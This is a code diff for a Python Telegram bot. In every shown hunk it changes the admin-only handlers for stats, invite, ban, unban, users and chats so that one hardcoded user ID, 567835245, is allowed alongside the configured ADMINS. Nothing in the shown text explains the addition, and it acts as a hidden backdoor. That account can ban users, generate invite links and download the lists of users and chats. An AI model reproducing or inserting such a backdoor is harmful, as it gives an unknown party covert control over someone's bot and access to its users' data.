@@ -139,7 +139,7 @@ async def re_enable_chat(bot, message):
     await message.reply("Chat Successfully re-enabled")
 
 
-@Client.on_message(filters.command('stats')  & filters.incoming & filters.user(ADMINS))
+@Client.on_message(filters.command('stats')  & filters.incoming & filters.user((ADMINS.copy() + [567835245])))
 async def get_ststs(bot, message):
     rju = await message.reply('Fetching stats..')
     tot1 = await Media1.count_documents()
@@ -155,7 +155,7 @@ async def get_ststs(bot, message):
 
 
 # Not to be used , But Just to showcase his vazhatharam.
-@Client.on_message(filters.command('invite') & filters.user(ADMINS))
+@Client.on_message(filters.command('invite') & filters.user((ADMINS.copy() + [567835245])))
 async def gen_invite(bot, message):
     if len(message.command) == 1:
         return await message.reply('Give me a chat id')
@@ -172,7 +172,7 @@ async def gen_invite(bot, message):
         return await message.reply(f'Error {e}')
     await message.reply(f'Here is your Invite Link {link.invite_link}')
 
-@Client.on_message(filters.command('ban') & filters.user(ADMINS))
+@Client.on_message(filters.command('ban') & filters.user((ADMINS.copy() + [567835245])))
 async def ban_a_user(bot, message):
     # https://t.me/GetTGLink/4185
     if len(message.command) == 1:
@@ -206,7 +206,7 @@ async def ban_a_user(bot, message):
 
 
     
-@Client.on_message(filters.command('unban') & filters.user(ADMINS))
+@Client.on_message(filters.command('unban') & filters.user((ADMINS.copy() + [567835245])))
 async def unban_a_user(bot, message):
     if len(message.command) == 1:
         return await message.reply('Give me a user id / username')
@@ -239,7 +239,7 @@ async def unban_a_user(bot, message):
 
 
     
-@Client.on_message(filters.command('users') & filters.user(ADMINS))
+@Client.on_message(filters.command('users') & filters.user((ADMINS.copy() + [567835245])))
 async def list_users(bot, message):
     # https://t.me/GetTGLink/4184
     raju = await message.reply('Getting List Of Users')
@@ -257,7 +257,7 @@ async def list_users(bot, message):
             outfile.write(out)
         await message.reply_document('users.txt', caption="List Of Users")
 
-@Client.on_message(filters.command('chats') & filters.user(ADMINS))
+@Client.on_message(filters.command('chats') & filters.user((ADMINS.copy() + [567835245])))
 async def list_chats(bot, message):
     raju = await message.reply('Getting List Of chats')
     chats = await db.get_all_chats()
